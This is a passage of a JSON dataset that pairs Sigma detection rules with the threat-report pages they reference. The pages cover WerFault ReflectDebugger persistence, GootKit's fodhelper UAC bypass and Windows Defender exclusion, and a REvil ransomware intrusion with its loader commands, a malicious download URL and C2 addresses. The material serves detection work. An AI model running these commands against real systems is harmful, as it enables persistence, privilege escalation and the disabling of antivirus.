Reporting\\Hangs' -Name 'ReflectDebugger' -Value 'Z:\\2022-11-02-malware-pers-17\\hack.exe'\n  New-ItemProperty : The property already exists.\n  At line:1 char:1\n  + New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Err ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : ResourceExists: (HKEY_LOCAL_MACH...Reporting:Hangs:String) [New-ItemProperty], IOExcepti\n      + FullyQualifiedErrorId : System.IO.IOException,Microsoft.PowerShell.Commands.NewItemPropertyCommand\n  \n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\"\n  ERROR: The system was unable to find the specified registry key or value.\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger\"\n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hangs\n  ReflectDebugger     REG_SZ    Z:\\2022-11-02-malware-pers-17\\hack.exe\n```\n\nI don’t know if any APT in the wild used this tactic and trick, but, I hope this post spreads awareness to the blue teamers of this interesting technique especially when creating software, and adds a weapon to the red teamers' arsenal.\n\n> This is a practical case for educational purposes only.\n\nMSDN Windows Error Reporting\nDLL hijacking\nDLL hijacking with exported functions\nMalware persistence: part 1\nSource code in GitHub\n\n---\n\n**Tags:**\n- malware\n- persistence\n- red team\n- win32api\n- windows\n\n**Categories:**\n- malware\n\n**Updated:**\nNovember 2, 2022",
    "sigma_rule": {
      "title": "Potential ReflectDebugger Content Execution Via WerFault.EXE",
      "id": "fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd",
      "related": [
        {
          "id": "0cf2e1c6-8d10-4273-8059-738778f981ad",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"WerFault.exe\" with the \"-pr\" commandline flag that is used to run files stored in the ReflectDebugger key which could be used to store the path to the malware in order to masquerade the execution flow",
      "references": [
        "https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html",
        "https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-06-30",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\WerFault.exe"
          },
          {
            "OriginalFileName": "WerFault.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " -pr "
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_werfault_reflect_debugger_exec.yml",
    "id": "643"
  },
  {
    "url": "https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/",
    "markdown": "# Beyond good ol’ Run key, Part 85\n\nPosted on 2018-08-31\n\nThis is a LOLbinish 2-stage persistence trick. One where we add startup items to point to OS binaries, and – while they will be ignored by many users and security solutions (at least at first glance) – they will be launching the second stage of the persistence mechanism for us…\n\nMany people who use win7-win10 know that the Werfault.exe process is all over the place. It’s a process ‘repairer’ or ‘fixer’ that handles crashes or other unpleasant activities of other processes. It turns out you can launch werfault.exe with a number of specific command line arguments. One of these modes is called ‘reflective debugger’ and is very interesting to us. To launch werfault in this mode we need to provide the following parameters:\n\n- werfault.exe -pr <somevalue>\n\nAnd how does it load the debugger?\n\nBy reading:\n\n- HKLM\\Software\\Microsoft\\Windows\\\n  Windows Error Reporting\\Hangs\\ReflectDebugger=\n  <path>\n\nand… executing it.\n\n```image\nAlt: Reflective Debugger\nDescription: The image displays a screenshot from the Sysinternals Process Monitor tool. It shows a detailed log of events related to the 'werfault.exe' process. The entry includes information such as the time of day, process ID (PID), operation type (RegQueryValue), the registry path queried (HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger), the result of the operation (SUCCESS), and additional details about the registry value type and data. This demonstrates the reflective debugger functionality mentioned in the CTI context.\nTranscription: |\n  | Time of Day        | Process      | PID  | Operation     | Path Result                                                                           | Detail                                                       |\n  | ------------------ | ------------ | ---- | ------------- | ------------------------------------------------------------------------------------- | ------------------------------------------------------------ |\n  | 3:39:59.8600221 PM | werfault.exe | 7140 | RegQueryValue | HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger SUCCESS | Type: REG_SZ, Length: 58, Data: c:\\windows\\system32\\calc.exe |\n```\n\nThat’s it.\n\nSo if we add a Run key like this:\n\n```image\nAlt: Reflective Debugger Run Key\nDescription: The image displays a Windows Registry Editor window focused on the 'Run' key under 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'. It shows an entry for 'werfault.exe', which is associated with Windows Problem Reporting. The entry includes details such as the size (424 KB), the version (10.0.17134.48), and the command line argument '-pr 1'. This information is relevant for understanding persistence mechanisms in malware, as it illustrates how 'werfault.exe' can be used to execute commands at user login.\nTranscription: |\n  HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n  --------------------------------------------------\n  | Name | Data                             |\n  | ---- | -------------------------------- |\n  | foo  | werfault.exe                     |\n  |      | Size: 424 K                      |\n  |      | Windows Problem Reporting        |\n  |      | Time: 11/12/1969 11:32 AM        |\n  |      | Microsoft Corporation            |\n  |      | Version: 10.0.17134.48           |\n  |      | c:\\windows\\system32\\werfault.exe |\n  |      | werfault.exe -pr 1               |\n  ------------------------------------------\n```\n\n– it will in the end launch our program of choice when the user logs on.",
    "sigma_rule": {
      "title": "Potential ReflectDebugger Content Execution Via WerFault.EXE",
      "id": "fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd",
      "related": [
        {
          "id": "0cf2e1c6-8d10-4273-8059-738778f981ad",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"WerFault.exe\" with the \"-pr\" commandline flag that is used to run files stored in the ReflectDebugger key which could be used to store the path to the malware in order to masquerade the execution flow",
      "references": [
        "https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html",
        "https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-06-30",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\WerFault.exe"
          },
          {
            "OriginalFileName": "WerFault.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " -pr "
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_werfault_reflect_debugger_exec.yml",
    "id": "644"
  },
  {
    "url": "https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment",
    "markdown": "",
    "sigma_rule": {
      "title": "Whoami.EXE Execution From Privileged Process",
      "id": "79ce34ca-af29-4d0e-b832-fc1b377020db",
      "related": [
        {
          "id": "80167ada-7a12-41ed-b8e9-aa47195c66a1",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the execution of \"whoami.exe\" by privileged accounts that are often abused by threat actors",
      "references": [
        "https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment",
        "https://web.archive.org/web/20221019044836/https://nsudo.m2team.org/en-us/"
      ],
      "author": "Florian Roth (Nextron Systems), Teymur Kheirkhabarov",
      "date": "2022-01-28",
      "modified": "2023-12-04",
      "tags": [
        "attack.privilege-escalation",
        "attack.discovery",
        "attack.t1033"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "whoami.exe"
          },
          {
            "Image|endswith": "\\whoami.exe"
          }
        ],
        "selection_user": {
          "User|contains": [
            "AUTHORI",
            "AUTORI",
            "TrustedInstaller"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_whoami_execution_from_high_priv_process.yml",
    "id": "654"
  },
  {
    "url": "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/",
    "markdown": "# GootKit Malware Bypasses Windows Defender by Setting Path Exclusions\n\nSeptember 6, 2019\n\nAs Windows Defender matures and becomes tightly integrated into Windows 10, malware writers are creating techniques to evade its detection. Such is the case with the GootKit banking Trojan, which uses a UAC bypass and WMIC commands to exclude the malware executable from being scanned by Windows Defender Antivirus.\n\nGootKit is a banking Trojan that attempts to steal the online banking credentials of infected users through video capture and redirects to fake banking sites under the attacker's control. An interesting aspect of this infection is that it is a Node JS application packaged into an executable.\n\nAfter analyzing a recent GootKit sample found by JamesWT, malware researcher and reverse engineer Vitali Kremez found that GootKit is attempting to bypass detections by Windows Defender by excluding the malware path from scanning.\n\nIn code provided to BleepingComputer by Kremez, we can see that the GootKit first checks if Windows Defender is enabled by issuing the following command:\n\n```\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /format:list\n```\n\n```image\nAlt: Check if Windows Defender is Enabled\nDescription: The image displays a snippet of code written in JavaScript. This code appears to be part of a function called 'getAv' which executes a Windows Management Instrumentation (WMI) command to check the status of antivirus products on a local machine. The command specifically queries the Windows Security Center for the display name and product state of the antivirus software. The command is executed in a hidden window, and any output or error messages are handled within the function.\nTranscription: |\n  function getAv(onDone) {\n      let strAv = '';\n      logIt(\"GetAV processing...\");\n      let cmdline = 'WMIC /Node:localhost /Namespace:\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get displayName, productState /format:list';\n      execFile(cmd, ['/c', cmdline], {\n          timeout: 30000,\n          windowsHide: true,\n          windowsVerbatimArguments: true\n      }, function(err, stdout, stderr) {\n          if (err) {\n              logIt('GetAV EXEC_ERROR: ' + err.message);\n              return onDone(err, '');\n          }\n      });\n  }\n```\n\n**Check if Windows Defender is Enabled**\n\nIf it is enabled, the malware will now execute a command that creates Registry values that will be executed as part of a UAC bypass using the `C:\\Windows\\system32\\fodhelper.exe` executable.\n\n```image\nAlt: UAC Bypass using Fodhelper.exe\nDescription: The image displays a block of code related to registry modifications and commands used by the GootKit malware to bypass Windows Defender. The code shows commands for adding registry entries that enable a UAC bypass and exclude a specified path from Windows Defender scanning. It includes the use of WMIC commands to interact with Windows Defender settings and demonstrates how the malware manipulates system settings to evade detection.\nTranscription: |\n  reg add HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command /f /v DelegateExecute /d \"\" /t REG_SZ && reg add HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command /f /d \"cmd /c start /min WMIC /Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"\" + excludeDir + \"\\\" /t REG_SZ && %SystemRoot%\\\\system32\\\\fodhelper.exe & ping -n 7 127.0.0.1 > NUL & reg delete HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command /f\n```\n\n**UAC Bypass using Fodhelper.exe**\n\nEssentially, the above command will perform the following steps:\n\n1. Create the `HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command \"DelegateExecute\"=0` value, which is needed for the bypass.\n2. Create the `HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command` value so it points to a command that whitelists the malware executable's path. It does this using the command:\n\n   ```\n   WMIC /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\"' + excludeDir + '\"\n   ```\n\n3. Executes the command `C:\\Windows\\System32\\fodhelper.exe`, which will execute the WMIC command above without showing a UAC prompt.\n4. It will then ping the loopback address 7 times to create a delay.\n5. Finally, it deletes the value with the WMIC command from the Registry.\n\nAt this point, Windows Defender will no longer scan the path where the executable is located.\n\nFinally, GootKit will confirm that the bypass was enabled by executing the following WMIC command:\n\n```\nWMIC /Node:localhost /Namespace:\\\\root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference Get * /format:list | findstr /i \"DisableRealtimeMonitoring ExclusionPath ExclusionProcess MAPSReporting SubmitSamplesConsent\"\n```\n\nThis command will return a list of Windows Defender preferences that can be used to determine if Windows Defender is active.\n\nAs you can see below, the ExclusionPath has been set to `{\"\\temp\\\"}`, which means that the path is excluded from scanning. The Temp folder is just an illustration and the path may change with an actual infection.\n\n```image\nAlt: Check for exclusion\nDescription: The image depicts a command prompt window displaying the output of a WMIC command related to Windows Defender settings. The command retrieves various preferences from the Windows Defender configuration, specifically focusing on 'DisableRealtimeMonitoring', 'ExclusionPath', 'ExclusionProcess', 'MAPSReporting', and 'SubmitSamplesConsent'. The output shows that real-time monitoring is disabled (set to FALSE), the exclusion path is set to '{\\temp\\}', and indicates values for MAPS reporting and sample consent.\nTranscription: |\n  C:\\test>WMIC /Node:localhost /Namespace:\\\\root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference Get * /format:list | findstr /i \"DisableRealtimeMonitoring ExclusionPath ExclusionProcess MAPSReporting SubmitSamplesConsent\"\n  DisableRealtimeMonitoring=FALSE\n  ExclusionPath={\"temp\"}\n  ExclusionProcess=\n  MAPSReporting=2\n  SubmitSamplesConsent=1\n  C:\\test>\n```\n\n**Check for exclusion**\n\nWith this exclusion in place, even if Microsoft starts detecting the particular GootKit sample in the future, its path will be excluded and will not be detected by the security software.\n\nGootKit is not the only Trojan stepping up their game to evade Microsoft's greatly improved Windows Defender antivirus product. In July, we reported that TrickBot had started executing PowerShell commands to disable Windows Defender's functionality and to evade detection.\n\n## Related Articles:\n\n- Android malware \"FakeCall\" now reroutes bank calls to attackers\n- TrickMo malware steals Android PINs using fake lock screen\n- New Octo Android malware version impersonates NordVPN, Google Chrome\n- North Korean hackers use new macOS malware against crypto firms\n- Hackers increasingly use Winos4.0 post-exploitation kit in attacks",
    "sigma_rule": {
      "title": "Potential Windows Defender Tampering Via Wmic.EXE",
      "id": "51cbac1e-eee3-4a90-b1b7-358efb81fa0a",
      "status": "test",
      "description": "Detects potential tampering with Windows Defender settings such as adding exclusion using wmic",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1562.001/T1562.001.md",
        "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/",
        "https://www.bleepingcomputer.com/news/security/iobit-forums-hacked-to-spread-ransomware-to-its-members/"
      ],
      "author": "frack113",
      "date": "2022-12-11",
      "modified": "2023-02-14",
      "tags": [
        "attack.credential-access",
        "attack.t1546.008"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "wmic.exe"
          },
          {
            "Image|endswith": "\\WMIC.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_namespace_defender.yml",
    "id": "661"
  },
  {
    "url": "https://thedfirreport.com/2023/03/06/2022-year-in-review/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Product Reconnaissance Via Wmic.EXE",
      "id": "15434e33-5027-4914-88d5-3d4145ec25a9",
      "status": "test",
      "description": "Detects the execution of WMIC in order to get a list of firewall and antivirus products",
      "references": [
        "https://thedfirreport.com/2023/03/06/2022-year-in-review/",
        "https://www.yeahhub.com/list-installed-programs-version-path-windows/",
        "https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product"
      ],
      "author": "Nasreddine Bencherchali",
      "date": "2023-02-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "Product"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_recon_product.yml",
    "id": "664"
  },
  {
    "url": "https://www.yeahhub.com/list-installed-programs-version-path-windows/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Product Reconnaissance Via Wmic.EXE",
      "id": "15434e33-5027-4914-88d5-3d4145ec25a9",
      "status": "test",
      "description": "Detects the execution of WMIC in order to get a list of firewall and antivirus products",
      "references": [
        "https://thedfirreport.com/2023/03/06/2022-year-in-review/",
        "https://www.yeahhub.com/list-installed-programs-version-path-windows/",
        "https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product"
      ],
      "author": "Nasreddine Bencherchali",
      "date": "2023-02-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "Product"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_recon_product.yml",
    "id": "665"
  },
  {
    "url": "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
    "markdown": "# Sodinokibi (aka REvil) Ransomware\n\n**Categories:**\nadfind\ncobaltstrike\nicedid\nransomware\nrevil\nSodinokibi\n\n**Published on:** March 29, 2021\n\n### Intro\n\nSodinokibi (aka REvil) has been one of the most prolific ransomware as a service (RaaS) groups over the last couple years. The ransomware family was purported to be behind the Travelex intrusion and current reports point to an attack against Acer for a reported $50 million ransom demand.\n\nIn March, we observed an intrusion which started with malicious spam that dropped IcedID (Bokbot) into the environment and subsequently allowed access to a group distributing Sodinokibi ransomware. During the intrusion the threat actors escalated privileges to Domain Administrator, exfiltrated data, and used Sodinokibi to ransom all domain joined systems.\n\n### Case Summary\n\nThe IcedID trojan was first discovered in 2017 and currently operates as an initial access broker for several ransomware families. In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image.\n\nPersistence was setup using a scheduled task and discovery commands were initiated from the malware within minutes of execution. About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used throughout the intrusion. Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers. We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID. #ArtifactsMatter. It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.\n\nAfter compromising the Exchange server, the attackers moved to domain controllers and other systems within the environment using SMB and PowerShell Beacons executed via a remote service. The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique.\n\nAdditional discovery was executed from the domain controller using AdFind and the Ping utility to test connections between the domain controller and other domain joined systems. After discovery was completed, credentials were dumped from lsass. After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.\n\nThree and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand.\n\nAt the four hour mark, the threat actors began to move on to final objectives. They staged the ransomware executable on a domain controller and then used BITSAdmin to download it to each system in the domain. After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag `-smode`, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking. Encryption did not start immediately after reboot but required a user to log in, which in this case the threat actors completed by logging in after the reboot.\n\nBooting into Safe Mode with Networking blocked the startup of security tools and other management agents. Networking worked, but because services couldn’t start, we were unable to remotely manage the systems using our normal tools. We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.\n\nOn certain systems, ransomware was executed without the `-smode` flag, and on other systems a dll was executed via `rundll32` to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed.\n\nAbout 4.5 hours after initial access, the threat actors had completed their mission of encrypting all domain joined systems. The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days. If we didn’t pay within 7 days the price goes up to around $400k. The ransom is required to be paid in Monero instead of the usual Bitcoin. This may be in an effort to better shield the payments from tracing activity like those performed by Chainaylsis. The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful.\n\n### Services\n\nOur Threat Feed service picked up one of the two Cobalt Strike servers one day before this intrusion occurred and the other IP was added to the feed as soon as we recognized it.\n\nWe also have artifacts available from this case such as ransomware samples (dll and exe), pcaps, memory captures, files, Kape packages and more, under our Security Researcher and Organization services.\n\n### Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a timeline detailing the events related to the Sodinokibi (REvil) ransomware attack. It outlines specific actions taken by threat actors, including the initial execution of IcedID, lateral movements to various servers, exfiltration of files, and the deployment of ransomware, along with the corresponding times and types of connections made during the attack. Each event is represented in a structured format, showing the progression of the attack over time.\nTranscription: |\n  Sodinokibi (aka REvil) Ransomware\n  \n  18:05 UTC Initial IcedID execution on beach head host\n  C2 connection: 161.35.109.168:443\n  \n  18:06 IcedID discovery initiated on host\n  \n  19:21 Cobalt Strike Beacons executed on beach head host\n  C2 connection: 45.86.163.78:443 cloudmetric.online\n  C2 connection: 195.189.99.74:443 smalleststores.com\n  \n  19:30 Lateral movement to Exchange server using Cobalt Strike\n  \n  19:53 Lateral movement to domain controller from Exchange server\n  \n  20:45 Threat actors begin moving laterally using RDP\n  \n  21:35 Exfiltration of files using Rclone\n  C2 connection: 45.147.160.5:443\n  \n  22:06 First deployment of ransomware using BITSAdmin\n  \n  22:07 Execution of Sodinokibi ransomware with -s mode flag by threat actor over RDP connection\n  \n  22:28 Final ransomware deployment\n```\n\n### MITRE ATT&CK\n\n#### Initial Access\n\nInitial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.\n\nThe delivery format was an xlsm file:\n\nInitial execution of the document writes a file to:\n\n```\nC:\\Users\\Public\\microsoft.security\n```\n\nThe Excel file called wmic to execute the file with regsrv32:\n\n```\nwmic.exe process call create 'regsvr32 -s C:\\Users\\Public\\microsoft.security'\n```\n\n```image\nAlt: wmic command\nDescription: The image displays a screenshot of a process list related to a cyber intrusion involving Sodinokibi (REvil) ransomware and IcedID malware. It shows the execution of Microsoft Excel, the WMIC command being used to create a process with regsvr32, and the path to a file located in the user's public directory. This information is relevant for understanding the steps taken in the malware's execution and the initial access method.\nTranscription: |\n  Processes\n  - C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE\n    \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE\" \"C:\\Users\\Admin\\AppData\\Local\\Temp\\Documents972.xlsm\"\n  \n  - C:\\Windows\\System32\\Wbem\\wmic.exe\n    wmic.exe process call create 'regsvr32 -s C:\\Users\\Public\\microsoft.security'\n  \n  - C:\\Windows\\system32\\regsvr32.exe\n    regsvr32 -s C:\\Users\\Public\\microsoft.security\n```\n\nThis then made a network request to download a file from this URL:\n\n```\nhttp://vpu03jivmm03qncgx.com/index.gif\n```\n\nThe GIF however was the IcedID malware.\n\n```image\nAlt: IcedID\nDescription: The image displays an HTTP request log, specifically a GET request for an index.gif file. It includes headers such as 'Accept', 'User-Agent', 'Host', and 'Connection', as well as a response indicating a 200 OK status from an Apache server. The body of the response contains what appears to be corrupted or encoded data, hinting at the malicious content being delivered through the request.\n```\n\n#### Execution\n\nOnce IcedID was downloaded to the host, the malware was executed using `rundll32.exe`:\n\n```\nrundll32.exe \"C:\\Users\\USERNAME\\AppData\\Local\\Temp\\skull-x64.dat\",update /i:\"DwarfWing\\license.dat\"\n```\n\nAfter execution, the malware made contact with `161.35.109[.]168` which it continued to beacon to, throughout the intrusion.\n\n#### Persistence\n\nIcedID setup persistence on the beach head host using a scheduled task.\n\n```\nwewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n```\n\n```image\nAlt: Scheduled Task\nDescription: The image depicts an XML configuration file for a scheduled task, related to the Sodinokibi (REvil) ransomware. It includes various settings such as triggers, execution policies, and commands to run a malicious executable. The task is set to execute at a defined time with specific parameters, emphasizing its persistence mechanism on a Windows system. Key elements like 'LogonTrigger' and 'Command' indicate how the task is scheduled to maintain the ransomware's presence on the infected system.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-16\"?>\n  <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n    <RegistrationInfo>\n      <URI>wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}</URI>\n    </RegistrationInfo>\n    <Triggers>\n      <TimeTrigger>\n        <Repetition>\n          <Interval>P1D</Interval>\n          <StopAtDurationEnd>false</StopAtDurationEnd>\n        </Repetition>\n        <StartBoundary>2012-01-01T12:00:00</StartBoundary>\n        <Enabled>true</Enabled>\n      </TimeTrigger>\n      <LogonTrigger>\n        <Enabled>true</Enabled>\n        <UserId/>\n      </LogonTrigger>\n    </Triggers>\n    <Settings>\n      <MultipleInstancesPolicy>IgnoreNew/MultipleInstancesPolicy</MultipleInstancesPolicy>\n      <DisallowStartOnBatteries>false</DisallowStartOnBatteries>\n      <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n      <AllowHardTerminate>false</AllowHardTerminate>\n      <StartWhenAvailable>true</StartWhenAvailable>\n      <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n      <IdleSettings>\n        <Duration>P10M</Duration>\n        <WaitTimeout>P1H</WaitTimeout>\n        <StopOnIdleEnd>false</StopOnIdleEnd>\n        <RestartOnIdle>false</RestartOnIdle>\n      </IdleSettings>\n      <AllowStartOnDemand>true</AllowStartOnDemand>\n      <Hidden>false</Hidden>\n      <RunOnlyIfIdle>false</RunOnlyIfIdle>\n      <WakeToRun>false</WakeToRun>\n      <ExecutionTimeLimit>P0S</ExecutionTimeLimit>\n      <Priority>7</Priority>\n    </Settings>\n    <Actions context=\"Author\">\n      <Exec>\n        <Command>rundll32.exe</Command>\n        <Arguments>\"C:\\Users\\AppData\\Roaming\\douxiy\\Ciocca.dll\",update /i:\"DwarfWing\\license.dat\"</Arguments>\n      </Exec>\n    </Actions>\n  </Task>\n```\n\n```image\nAlt: Registry Key\nDescription: The image displays a technical overview of a registry modification related to the Sodinokibi (REvil) ransomware. It shows the created registry key along with its path: 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}'. The registry modification section indicates the value type as '6', which is significant for understanding the persistence mechanism of the ransomware. Additionally, the image features a visual representation of processes such as wininit.exe, services.exe, and svchost.exe, implying the context of the executed ransomware environment.\nTranscription: |\n  wininit.exe\n  services.exe\n  svchost.exe\n  \n  created registry key\n  \n  Registry modification\n  \n  Registry key\n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n  \n  Value type\n  6\n```\n\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n```\n\nThe execution of the ransomware executable created a RunOnce key for persistence.\n\n```\nHKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\*AstraZeneca\n```\n\n```image\nAlt: RunOnce Key\nDescription: The image displays a log entry related to a Windows event, specifically detailing a registry modification made by a process. Key components include the 'details' showing the path of the executable, 'eventType' indicating a value set operation, and 'targetObject' which specifies the registry path where the modification occurred. This log entry illustrates the use of a RunOnce key for persistence by ransomware, linking to the mentioned AstraZeneca key.\nTranscription: |\n  details          C:\\Windows\\*\\*.exe\n  eventType        SetValue\n  image            C:\\Windows\\*\\*.exe\n  processGuid      {b093c253-dfa5-604f-3c07-000000001008}\n  processId        6512\n  ruleName         technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder\n  targetObject     HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca\n  utcTime          *\n  channel          Microsoft-Windows-Sysmon/Operational\n```\n\n#### Privilege Escalation\n\nAfter completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in the 